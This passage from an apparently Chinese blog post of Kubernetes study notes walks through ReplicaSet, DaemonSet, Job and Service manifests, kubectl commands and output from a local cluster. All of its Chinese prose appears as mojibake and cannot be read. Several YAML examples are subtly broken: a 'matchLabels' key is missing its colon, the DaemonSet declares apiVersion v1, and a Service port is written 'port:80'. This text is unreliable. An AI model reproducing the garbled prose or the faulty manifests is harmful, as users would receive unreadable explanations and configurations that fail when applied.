title="ReplicaSet"></a>ReplicaSet</h4><p>ReplicaSetçš„è¡Œä¸ºå’ŒReplicationControllerå®Œå…¨ç›¸åŒï¼Œä½†æ˜¯podé€‰æ‹©å™¨çš„è¡¨è¾¾èƒ½åŠ›æ›´å¼º</p><h5 id="å®šä¹‰ReplicaSet"><a href="#å®šä¹‰ReplicaSet" class="headerlink" title="å®šä¹‰ReplicaSet"></a>å®šä¹‰ReplicaSet</h5><p>é¦–å…ˆåˆ›å»ºä¸€ä¸ªåä¸º<code>kubia-replicaset.yaml</code>çš„YAMLæ–‡ä»¶</p><p>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ReplicaSetä¸æ˜¯<code>v1 API</code>çš„ä¸€éƒ¨åˆ†ï¼Œå®ƒå±äº<code>apps API</code>ç»„çš„<code>v1</code>ç‰ˆæœ¬ã€‚å…¶æ¬¡æ˜¯åœ¨é€‰æ‹©å…¶ä¸­ï¼Œä¸éœ€è¦å†selectorå±æ€§ä¸­ç›´æ¥åˆ—å‡ºpodéœ€è¦çš„æ ‡ç­¾ï¼Œè€Œæ˜¯åœ¨<code>selector.matchLabels</code>ä¸‹æŒ‡å®šå®ƒä»¬ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">apiVersion: apps/v1</span><br><span class="line">kind: ReplicaSet</span><br><span class="line">metadata:</span><br><span class="line">  name: kubia</span><br><span class="line">spec:</span><br><span class="line">  replicas: 3</span><br><span class="line">  selector:</span><br><span class="line">    matchLabels</span><br><span class="line">      app: kubia</span><br><span class="line">  template:</span><br><span class="line">    metadata:</span><br><span class="line">      labels:</span><br><span class="line">        app: kubia</span><br><span class="line">    spec:</span><br><span class="line">      containers:</span><br><span class="line">      - name: kubia</span><br><span class="line">        image: luksa/kubia</span><br><span class="line">        ports:</span><br><span class="line">        - containerPort: 8080</span><br></pre></td></tr></table></figure><p>åœ¨ä¸Šä¸€èŠ‚çš„åˆ é™¤ReplicationControllerä¸­ï¼Œæˆ‘ä»¬æ²¡æœ‰åˆ é™¤podã€‚å› æ­¤åœ¨åˆ›å»ºReplicaSetçš„æ—¶å€™ä¸ä¼šåˆ›å»ºä»»ä½•æ–°çš„podï¼ŒReplicaSetä¼šæŠŠç°æœ‰çš„ä¸‰ä¸ªpodå½’ä¸ºè‡ªå·±æ¥ç®¡ç†ã€‚</p><h5 id="åˆ›å»ºå’Œæ£€æŸ¥ReplicaSet"><a href="#åˆ›å»ºå’Œæ£€æŸ¥ReplicaSet" class="headerlink" title="åˆ›å»ºå’Œæ£€æŸ¥ReplicaSet"></a>åˆ›å»ºå’Œæ£€æŸ¥ReplicaSet</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl create -f kubia-replicaset.yaml</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨<code>kubectl get</code>æ¥è·å–å½“å‰çš„ReplicaSet</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl get rs</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨<code>kubectl describe</code>æ¥æ£€æŸ¥å½“å‰çš„ReplicaSet</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl describe rs</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ—¶å€™å¦‚æœæˆ‘ä»¬ä½¿ç”¨<code>kubectl get</code>æ¥åˆ—å‡ºå½“å‰çš„podï¼Œåˆ™ä¼šå‘ç°è¿˜æ˜¯ä¹‹å‰çš„é‚£ä¸‰ä¸ªpodï¼Œè€ŒReplicaSetå¹¶æ²¡æœ‰åˆ›å»ºæ–°çš„pod</p><h5 id="åˆ é™¤ReplicaSet"><a href="#åˆ é™¤ReplicaSet" class="headerlink" title="åˆ é™¤ReplicaSet"></a>åˆ é™¤ReplicaSet</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl delete rs kubia</span><br></pre></td></tr></table></figure><h4 id="DaemonSet"><a href="#DaemonSet" class="headerlink" title="DaemonSet"></a>DaemonSet</h4><p>DaemonSetç¡®ä¿å…¨éƒ¨ï¼ˆæˆ–è€…æŸäº›ï¼‰èŠ‚ç‚¹ä¸Šè¿è¡Œä¸€ä¸ª Pod çš„å‰¯æœ¬ã€‚ å½“æœ‰èŠ‚ç‚¹åŠ å…¥é›†ç¾¤æ—¶ï¼Œ ä¹Ÿä¼šä¸ºä»–ä»¬æ–°å¢ä¸€ä¸ª Pod ã€‚ å½“æœ‰èŠ‚ç‚¹ä»é›†ç¾¤ç§»é™¤æ—¶ï¼Œè¿™äº› Pod ä¹Ÿä¼šè¢«å›æ”¶ã€‚åˆ é™¤ DaemonSet å°†ä¼šåˆ é™¤å®ƒåˆ›å»ºçš„æ‰€æœ‰ Podã€‚</p><p>DaemonSet çš„ä¸€äº›å…¸å‹ç”¨æ³•ï¼š</p><ul><li>åœ¨æ¯ä¸ªèŠ‚ç‚¹ä¸Šè¿è¡Œé›†ç¾¤å®ˆæŠ¤è¿›ç¨‹</li><li>åœ¨æ¯ä¸ªèŠ‚ç‚¹ä¸Šè¿è¡Œæ—¥å¿—æ”¶é›†å®ˆæŠ¤è¿›ç¨‹</li><li>åœ¨æ¯ä¸ªèŠ‚ç‚¹ä¸Šè¿è¡Œç›‘æ§å®ˆæŠ¤è¿›ç¨‹</li></ul><p>ä¸€ç§ç®€å•çš„ç”¨æ³•æ˜¯ä¸ºæ¯ç§ç±»å‹çš„å®ˆæŠ¤è¿›ç¨‹åœ¨æ‰€æœ‰çš„èŠ‚ç‚¹ä¸Šéƒ½å¯åŠ¨ä¸€ä¸ª DaemonSetã€‚ ä¸€ä¸ªç¨å¾®å¤æ‚çš„ç”¨æ³•æ˜¯ä¸ºåŒä¸€ç§å®ˆæŠ¤è¿›ç¨‹éƒ¨ç½²å¤šä¸ª DaemonSetï¼›æ¯ä¸ªå…·æœ‰ä¸åŒçš„æ ‡å¿—ï¼Œ å¹¶ä¸”å¯¹ä¸åŒç¡¬ä»¶ç±»å‹å…·æœ‰ä¸åŒçš„å†…å­˜ã€CPUè¦æ±‚ã€‚</p><p>DaemonSetå°†podéƒ¨ç½²åˆ°é›†ç¾¤ä¸­çš„æ‰€æœ‰èŠ‚ç‚¹ä¸Šï¼Œé™¤éæŒ‡å®šè¿™äº›podåªåœ¨éƒ¨åˆ†èŠ‚ç‚¹ä¸Šè¿è¡Œï¼Œè¿™æ˜¯é€šè¿‡podæ¨¡ç‰ˆä¸­çš„nodeSelectorå±æ€§æŒ‡å®šçš„ï¼Œè¿™æ˜¯DaemonSetå®šä¹‰çš„ä¸€éƒ¨åˆ†ã€‚</p><h5 id="ä¸€ä¸ªä¾‹å­"><a href="#ä¸€ä¸ªä¾‹å­" class="headerlink" title="ä¸€ä¸ªä¾‹å­"></a>ä¸€ä¸ªä¾‹å­</h5><p>å‡è®¾æœ‰ä¸€ä¸ªåä¸ºssd-monitorçš„å®ˆæŠ¤è¿›ç¨‹ï¼Œå®ƒéœ€è¦åœ¨åŒ…å«å›ºæ€é©±åŠ¨å™¨(SSD)çš„æ‰€æœ‰èŠ‚ç‚¹ä¸Šè¿è¡Œï¼Œæˆ‘ä»¬éœ€è¦åˆ›å»ºä¸€ä¸ªDaemonSetï¼Œå®ƒåœ¨æ ‡è®°ä¸ºå…·æœ‰SSDçš„æ‰€æœ‰èŠ‚ç‚¹ä¸Šè¿è¡Œè¿™ä¸ªå®ˆæŠ¤è¿›ç¨‹ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤º</p><p><img src="/2021/10/07/Kubernetes-in-Action-Learning-Notes/4.png" alt="4"></p><p>ç¬¬ä¸€æ­¥è¿˜æ˜¯åˆ›å»ºä¸€ä¸ªDaemonSetçš„YAMLæ–‡ä»¶ï¼Œè¿™æ ·ä¼šåˆ›å»ºä¸€ä¸ªè¿è¡Œssd-monitorç›‘æ§å™¨è¿›ç¨‹çš„DaemonSetï¼Œè¯¥è¿›ç¨‹æ¯5sä¼šå°†â€SSD OKâ€æ‰“å°åˆ°æ ‡å‡†è¾“å‡ºã€‚YAMLæ–‡ä»¶åä¸º<code>ssd-monitor-daemonset.yaml</code></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">DaemonSet</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">ssd-monitor</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">app:</span> <span class="string">ssd-monitor</span></span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">app:</span> <span class="string">ssd-monitor</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">nodeSelector:</span></span><br><span class="line">        <span class="attr">disk:</span> <span class="string">ssd</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">main</span></span><br><span class="line">        <span class="attr">image:</span> <span class="string">luksa/ssd-monitor</span></span><br></pre></td></tr></table></figure><p>é€šè¿‡<code>kubectl create</code>åˆ›å»ºDaemonSet</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl create -f ssd-monitor-daemonset.yaml</span><br></pre></td></tr></table></figure><p>é€šè¿‡<code>kubectl get</code>æŸ¥çœ‹DaemonSet</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl get ds</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ—¶å€™æˆ‘ä»¬è·å–podä¿¡æ¯å‘ç°æ²¡æœ‰podç›¸å…³ä¿¡æ¯ï¼Œè¿™æ˜¯å› ä¸ºæˆ‘ä»¬æ²¡æœ‰ç»™èŠ‚ç‚¹æ‰“ä¸Š<code>disk=ssd</code>çš„æ ‡ç­¾ï¼Œå’Œä¸Šé¢é‚£ä¸ªå›¾æè¿°çš„ä¸€æ ·ï¼Œå¦‚æœèŠ‚ç‚¹æ²¡æœ‰<code>disk=ssd</code>è¿™ä¸ªæ ‡ç­¾ï¼Œåˆ™DaemonSetä¸ä¼šä¸ºè¯¥èŠ‚ç‚¹éƒ¨ç½²podï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦ä¸ºèŠ‚ç‚¹æ·»åŠ æ ‡ç­¾ï¼Œè¿™é‡Œæˆ‘ä½¿ç”¨çš„èŠ‚ç‚¹ä¸º<code>docker-desktop</code>ï¼Œå½“ç„¶ä½ ä¹Ÿå¯ä»¥é€šè¿‡<code>kubectl get node</code>è·å–ä½ çš„èŠ‚ç‚¹ä¿¡æ¯ã€‚</p><p>ç°åœ¨ç»™èŠ‚ç‚¹æ·»åŠ <code>disk=ssd</code>æ ‡ç­¾</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl label node docker-desktop disk=ssd</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹æ˜¯å¦æˆåŠŸä¸ºèŠ‚ç‚¹æ‰“ä¸Šæ ‡ç­¾</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl get node --show-labels              </span><br><span class="line">NAME             STATUS   ROLES                  AGE   VERSION   LABELS</span><br><span class="line">docker-desktop   Ready    control-plane,master   43h   v1.21.3   beta.kubernetes.io/arch=amd64,beta.kubernetes.io/os=linux,disk=ssd,kubernetes.io/arch=amd64,kubernetes.io/hostname=docker-desktop,kubernetes.io/os=linux,node-role.kubernetes.io/control-plane=,node-role.kubernetes.io/master=,node.kubernetes.io/exclude-from-external-load-balancers=</span><br></pre></td></tr></table></figure><p>ç°åœ¨é‡æ–°è·å–èŠ‚ç‚¹ä¿¡æ¯</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl get pods</span><br><span class="line">NAME                READY   STATUS    RESTARTS   AGE</span><br><span class="line">ssd-monitor-6gmhm   1/1     Running   0          78s</span><br></pre></td></tr></table></figure><p>å‡å¦‚è¯´è¿™ä¸ªæ—¶å€™æˆ‘ä»¬ä¿®æ”¹äº†èŠ‚ç‚¹çš„æ ‡ç­¾ï¼Œçœ‹çœ‹ä¼šå‘ç”Ÿä»€ä¹ˆï¼Œå¦‚ä¸‹é¢å‘½ä»¤æ‰€ç¤ºï¼Œæˆ‘ä»¬å°†<code>disk=ssd</code>æ”¹ä¸ºäº†<code>disk=hdd</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl label node docker-desktop disk=hdd --overwrite</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å†æ¬¡æŸ¥çœ‹podï¼Œå‘ç°podæ­£åœ¨è¢«ç»ˆæ­¢</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl get pods                                      </span><br><span class="line">NAME                READY   STATUS        RESTARTS   AGE</span><br><span class="line">ssd-monitor-6gmhm   1/1     Terminating   0          3m59s</span><br></pre></td></tr></table></figure><p>åˆ é™¤èŠ‚ç‚¹æ ‡ç­¾ï¼Œå¦‚æœæˆ‘ä»¬è¦åˆ é™¤æŸä¸ªèŠ‚ç‚¹çš„æ ‡ç­¾ï¼Œå‘½ä»¤å¦‚ä¸‹ï¼Œå…¶ä¸­diskä¸ºæ ‡ç­¾çš„é”®ï¼Œåé¢çš„å‡å·ä»£è¡¨åˆ é™¤è¯¥æ ‡ç­¾</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl label node docker-desktop disk-</span><br></pre></td></tr></table></figure><h4 id="Job"><a href="#Job" class="headerlink" title="Job"></a>Job</h4><p>Job ä¼šåˆ›å»ºä¸€ä¸ªæˆ–è€…å¤šä¸ª Podsï¼Œå¹¶å°†ç»§ç»­é‡è¯• Pods çš„æ‰§è¡Œï¼Œç›´åˆ°æŒ‡å®šæ•°é‡çš„ Pods æˆåŠŸç»ˆæ­¢ã€‚ éšç€ Pods æˆåŠŸç»“æŸï¼ŒJob è·Ÿè¸ªè®°å½•æˆåŠŸå®Œæˆçš„ Pods ä¸ªæ•°ã€‚ å½“æ•°é‡è¾¾åˆ°æŒ‡å®šçš„æˆåŠŸä¸ªæ•°é˜ˆå€¼æ—¶ï¼Œä»»åŠ¡ï¼ˆå³ Jobï¼‰ç»“æŸã€‚ åˆ é™¤ Job çš„æ“ä½œä¼šæ¸…é™¤æ‰€åˆ›å»ºçš„å…¨éƒ¨ Podsã€‚ æŒ‚èµ· Job çš„æ“ä½œä¼šåˆ é™¤ Job çš„æ‰€æœ‰æ´»è·ƒ Podï¼Œç›´åˆ° Job è¢«å†æ¬¡æ¢å¤æ‰§è¡Œã€‚</p><p>ä¸€ç§ç®€å•çš„ä½¿ç”¨åœºæ™¯ä¸‹ï¼Œä½ ä¼šåˆ›å»ºä¸€ä¸ª Job å¯¹è±¡ä»¥ä¾¿ä»¥ä¸€ç§å¯é çš„æ–¹å¼è¿è¡ŒæŸ Pod ç›´åˆ°å®Œæˆã€‚ å½“ç¬¬ä¸€ä¸ª Pod å¤±è´¥æˆ–è€…è¢«åˆ é™¤ï¼ˆæ¯”å¦‚å› ä¸ºèŠ‚ç‚¹ç¡¬ä»¶å¤±æ•ˆæˆ–è€…é‡å¯ï¼‰æ—¶ï¼ŒJob å¯¹è±¡ä¼šå¯åŠ¨ä¸€ä¸ªæ–°çš„ Podã€‚</p><p>ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨ Job ä»¥å¹¶è¡Œçš„æ–¹å¼è¿è¡Œå¤šä¸ª Podã€‚</p><h5 id="å®šä¹‰Jobèµ„æº"><a href="#å®šä¹‰Jobèµ„æº" class="headerlink" title="å®šä¹‰Jobèµ„æº"></a>å®šä¹‰Jobèµ„æº</h5><p>è€è§„çŸ©ï¼Œè¿˜æ˜¯åˆ›å»ºä¸€ä¸ªåä¸º<code>exporter.yaml</code>çš„YAMLæ–‡ä»¶ã€‚è¯¥æ–‡ä»¶å®šä¹‰äº†ä¸€ä¸ªJobç±»å‹çš„èµ„æºï¼Œå®ƒå°†è¿è¡Œ<code>luksa/batch-job</code>é•œåƒï¼Œè¯¥é•œåƒè°ƒç”¨ä¸€ä¸ªè¿è¡Œ120ç§’çš„è¿›ç¨‹ï¼Œç„¶åé€€å‡ºã€‚åœ¨podé…ç½®çš„å±æ€§restartPolicyé»˜è®¤ä¸ºAlwaysï¼Œç„¶è€ŒJob podä¸èƒ½ä½¿ç”¨é»˜è®¤ç­–ç•¥ï¼Œå› ä¸ºå®ƒä»¬ä¸æ˜¯è¦æ— é™æœŸçš„è¿è¡Œä¸‹å»ï¼Œå› æ­¤éœ€è¦æ˜ç¡®æŒ‡å®šrestartPolicyä¸º<code>OnFailure</code>è¿˜æ˜¯<code>Never</code>ï¼Œè¿™ä¸€è®¾ç½®é˜²æ­¢å®¹å™¨åœ¨å®Œæˆä»»åŠ¡æ—¶é‡æ–°å¯åŠ¨ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">apiVersion: batch/v1</span><br><span class="line">kind: Job</span><br><span class="line">metadata:</span><br><span class="line">  name: batch-job</span><br><span class="line">spec:</span><br><span class="line">  template:</span><br><span class="line">    metadata:</span><br><span class="line">      labels:</span><br><span class="line">        app: batch-job</span><br><span class="line">    spec:</span><br><span class="line">      restartPolicy: OnFailure</span><br><span class="line">      containers:</span><br><span class="line">      - name: main</span><br><span class="line">        image: luksa/batch-job</span><br></pre></td></tr></table></figure><p>åˆ›å»ºè¯¥job</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl create -f exporter.yaml</span><br></pre></td></tr></table></figure><p>è·å–jobä¿¡æ¯</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl get jobs</span><br><span class="line">NAME        COMPLETIONS   DURATION   AGE</span><br><span class="line">batch-job   0/1           8s         8s</span><br></pre></td></tr></table></figure><p>è·å–podä¿¡æ¯</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl get pods</span><br><span class="line">NAME              READY   STATUS    RESTARTS   AGE</span><br><span class="line">batch-job-q8c44   1/1     Running   0          18s</span><br></pre></td></tr></table></figure><p>ä¸¤åˆ†é’Ÿä¹‹åï¼Œæˆ‘ä»¬å†æ¬¡è·å–podä¿¡æ¯ï¼Œä¼šå‘ç°è¯¥podçš„çŠ¶æ€è¢«æ ‡è®°ä¸ºå·²å®Œæˆã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl get pods</span><br><span class="line">NAME              READY   STATUS      RESTARTS   AGE</span><br><span class="line">batch-job-q8c44   0/1     Completed   0          2m15s</span><br></pre></td></tr></table></figure><p>podå®Œæˆåå¹¶æ²¡æœ‰è¢«åˆ é™¤ï¼Œè¿™æ ·æ–¹ä¾¿æˆ‘ä»¬æŸ¥é˜…è¯¥pod çš„æ—¥å¿—ï¼Œå¦‚ä¸‹å‘½ä»¤æ‰€ç¤º</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl logs batch-job-q8c44</span><br><span class="line">Fri Oct  8 10:07:58 UTC 2021 Batch job starting</span><br><span class="line">Fri Oct  8 10:09:58 UTC 2021 Finished succesfully</span><br></pre></td></tr></table></figure><h5 id="åœ¨Jobä¸­è¿è¡Œå¤šä¸ªpodå®ä¾‹"><a href="#åœ¨Jobä¸­è¿è¡Œå¤šä¸ªpodå®ä¾‹" class="headerlink" title="åœ¨Jobä¸­è¿è¡Œå¤šä¸ªpodå®ä¾‹"></a>åœ¨Jobä¸­è¿è¡Œå¤šä¸ªpodå®ä¾‹</h5><p>é¡ºåºè¿è¡Œï¼šè®¾ç½®<code>completions</code>çš„å€¼ä¸ºå¤šå°‘ï¼Œè¯¥jobå°±ä¼šåˆ›å»ºå¤šå°‘ä¸ªpodï¼Œç„¶åé¡ºåºè¿è¡Œã€‚</p><p>å¹¶è¡Œè¿è¡Œï¼šè®¾ç½®<code>parallelism</code>çš„å€¼ä¸ºå¤šå°‘ï¼Œè¯¥jobå°±ä¼šä¸€æ¬¡å¹¶è¡Œè¿è¡Œå¤šå°‘ä¸ªpodï¼Œå¹¶è¡Œè¿è¡Œä¸­ä¹Ÿè¦è®¾ç½®<code>completions</code>çš„å€¼</p><h5 id="é™åˆ¶job-podå®Œæˆä»»åŠ¡çš„æ—¶é—´"><a href="#é™åˆ¶job-podå®Œæˆä»»åŠ¡çš„æ—¶é—´" class="headerlink" title="é™åˆ¶job podå®Œæˆä»»åŠ¡çš„æ—¶é—´"></a>é™åˆ¶job podå®Œæˆä»»åŠ¡çš„æ—¶é—´</h5><p>é€šè¿‡åœ¨podé…ç½®ä¸­è®¾ç½®<code>activeDeadlineSeconds</code>å±æ€§ï¼Œå¯ä»¥é™åˆ¶podçš„æ—¶é—´ï¼Œå¦‚æœpodè¿è¡Œæ—¶é—´è¶…è¿‡æ­¤æ—¶é—´ï¼Œç³»ç»Ÿå°†å°è¯•ç»ˆæ­¢podï¼Œå¹¶å°†Jobæ ‡è®°ä¸ºå¤±è´¥ã€‚</p><h4 id="æœåŠ¡"><a href="#æœåŠ¡" class="headerlink" title="æœåŠ¡"></a>æœåŠ¡</h4><p>KubernetesæœåŠ¡æ˜¯ä¸€ç§ä¸ºä¸€ç»„åŠŸèƒ½ç›¸åŒçš„podæä¾›å•ä¸€ä¸å˜çš„æ¥å…¥ç‚¹çš„èµ„æºã€‚å½“æœåŠ¡å­˜åœ¨æ—¶ï¼Œå®ƒçš„IPåœ°å€å’Œç«¯å£ä¸ä¼šæ”¹å˜ï¼Œå®¢æˆ·ç«¯é€šè¿‡IPåœ°å€å’Œç«¯å£å·å»ºç«‹è¿æ¥ï¼Œè¿™äº›è¿æ¥ä¼šè¢«è·¯ç”±åˆ°æä¾›è¯¥æœåŠ¡çš„ä»»æ„ä¸€ä¸ªpodä¸Šï¼Œé€šè¿‡è¿™ç§æ–¹å¼ï¼Œå®¢æˆ·ç«¯ä¸éœ€è¦çŸ¥é“æ¯ä¸ªå•ç‹¬çš„æä¾›æœåŠ¡çš„podçš„åœ°å€ï¼Œè¿™æ ·è¿™äº›podå°±å¯ä»¥åœ¨é›†ç¾¤ä¸­éšæ—¶è¢«åˆ›å»ºæˆ–ç§»é™¤ã€‚å¦‚ä¸‹å›¾å±•ç¤ºçš„æ˜¯ä¸€ä¸ªå®¢æˆ·ç«¯è®¿é—®å‰ç«¯ï¼Œå‰ç«¯è®¿é—®åç«¯æœåŠ¡çš„ä¾‹å­ã€‚</p><p><img src="/2021/10/07/Kubernetes-in-Action-Learning-Notes/5.png" alt="5"></p><h5 id="åˆ›å»ºæœåŠ¡"><a href="#åˆ›å»ºæœåŠ¡" class="headerlink" title="åˆ›å»ºæœåŠ¡"></a>åˆ›å»ºæœåŠ¡</h5><p>åœ¨åˆ›å»ºæœåŠ¡ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆé€šè¿‡åˆ›å»ºReplicationControllerè¿è¡Œä¸‰ä¸ªåŒ…å«Node.jsåº”ç”¨çš„podã€‚è¿˜æ˜¯ä½¿ç”¨çš„æ˜¯ä¹‹å‰åˆ›å»ºçš„<code>kubia-rc.yaml</code>æ–‡ä»¶</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl create -f kubia-rc.yaml</span><br></pre></td></tr></table></figure><p>é€šè¿‡<code>kubectl get</code>å‘½ä»¤æ£€æµ‹podæ˜¯å¦æˆåŠŸå¯åŠ¨ï¼Œå¹¶æŸ¥çœ‹è¿™ä¸‰ä¸ªpodçš„æ ‡ç­¾</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl get pods --show-labels</span><br><span class="line">NAME          READY   STATUS    RESTARTS   AGE   LABELS</span><br><span class="line">kubia-hvlfd   1/1     Running   0          14s   app=kubia</span><br><span class="line">kubia-n6nfn   1/1     Running   0          14s   app=kubia</span><br><span class="line">kubia-ndbnt   1/1     Running   0          14s   app=kubia</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ—¶å€™é€šè¿‡YAMLæè¿°æ–‡ä»¶æ¥åˆ›å»ºæœåŠ¡ï¼Œè¯¥YAMLæ–‡ä»¶çš„åä¸º<code>kubia-svc.yaml</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">apiVersion: v1</span><br><span class="line">kind: Service</span><br><span class="line">metadata:</span><br><span class="line">  name: kubia</span><br><span class="line">spec:</span><br><span class="line">  ports:</span><br><span class="line">  - port:80 #è¯¥æœåŠ¡çš„å¯ç”¨ç«¯å£</span><br><span class="line">    targetPort: 8080  #æœåŠ¡å°†è¿æ¥è½¬å‘åˆ°çš„å®¹å™¨ç«¯å£</span><br><span class="line">  selector:</span><br><span class="line">    app: kubia #å…·æœ‰app=kubiaæ ‡ç­¾çš„podéƒ½å±äºè¯¥æœåŠ¡</span><br></pre></td></tr></table></figure><p>é€šè¿‡<code>kubectl create</code>å‘å¸ƒæ–‡ä»¶åˆ›å»ºæœåŠ¡</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl create -f kubia-svc.yaml</span><br></pre></td></tr></table></figure><p>åˆ—å‡ºæ‰€æœ‰çš„æœåŠ¡èµ„æºï¼Œå¦‚ä¸‹å‘½ä»¤ï¼Œå¯ä»¥çœ‹åˆ°ç¬¬äºŒä¸ªæ˜¯æˆ‘ä»¬åˆ›å»ºçš„æœåŠ¡</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl get svc</span><br><span class="line">NAME         TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)   AGE</span><br><span class="line">kubernetes   ClusterIP   10.96.0.1        &lt;none&gt;        443/TCP   44h</span><br><span class="line">kubia        ClusterIP   10.111.239.153   &lt;none&gt;        80/TCP    24s</span><br></pre></td></tr></table></figure><h5 id="ä»å†…éƒ¨é›†ç¾¤æµ‹è¯•æœåŠ¡"><a href="#ä»å†…éƒ¨é›†ç¾¤æµ‹è¯•æœåŠ¡" class="headerlink" 